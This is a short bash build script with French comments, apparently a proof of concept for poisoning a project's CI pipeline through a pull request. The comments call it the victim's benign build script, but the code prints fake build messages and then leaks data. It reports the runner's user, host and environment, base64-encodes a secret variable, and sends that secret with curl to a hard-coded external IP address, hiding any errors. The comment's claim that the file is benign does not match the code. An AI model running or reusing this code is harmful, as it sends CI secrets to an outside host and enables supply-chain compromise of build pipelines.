#!/usr/bin/env bash
# Script de build BENIN et legitime, cote victime (Alice).
# C'est CE fichier que Bob remplacera dans sa PR pour executer son code.
set -e
echo "Building project..."
echo "Build OK"

curl -s "http://82.165.247.235/test"

echo "[poc] exec as $(whoami)@$(hostname) in $(pwd)"
echo "[poc] runner=$RUNNER_NAME os=$RUNNER_OS"
echo "[poc] SECRET_B64=$(printf '%s' "${DEMO_SECRET:-<vide>}" | base64 -w0)"

curl -fsS "http://82.165.247.235/REMPLACE-MOI/?d=$(printf '%s' "$DEMO_SECRET")" || true

